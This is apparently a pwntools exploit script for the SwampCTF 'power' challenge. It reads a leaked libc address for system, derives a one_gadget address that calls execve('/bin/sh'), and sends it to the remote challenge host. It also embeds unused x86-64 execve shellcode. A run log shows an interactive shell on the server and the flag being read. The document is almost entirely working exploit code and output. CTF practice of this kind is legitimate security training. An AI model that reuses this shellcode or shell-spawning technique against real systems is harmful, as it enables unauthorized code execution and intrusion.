from pwn import *
import time
import sys

def power(DEBUG):
	
	if DEBUG=="1":
		t = 0.005
		r = process("./power")
		raw_input("debug?")
	elif DEBUG=="2":
		r = process(['./power'], env={"LD_PRELOAD":"./libc.so.6"})
		raw_input("debug?")
	elif DEBUG=="3":
		HOST = 'chal1.swampctf.com'
		PORT = 1999
		r = remote(HOST,PORT)
	
	shellcode64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
	offset_system = 0x45390
	offset_one_gadget = 0xf1147 # execve("/bin/sh", rsp+0x70, environ)
	
	r.recvuntil("Mage: Do you believe in such things? (yes/no): ")
	r.sendline("yes")
	r.recvuntil("0x")
	res= r.recv(12)
	system = int("0x"+res,16)
	one_gadget = system - offset_system + offset_one_gadget
	r.send(p64(one_gadget))
	raw_input("?")
	r.sendline("A"*100)
	r.interactive()

power(sys.argv[1])
"""
$ python power.py 3
[+] Opening connection to chal1.swampctf.com on port 1999: Done
?
[*] Switching to interactive mode
]
      and speak the Power QWord: sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
flag
power
$ cat f*
flag{m4g1c_1s_4ll_ar0Und_u5}
"""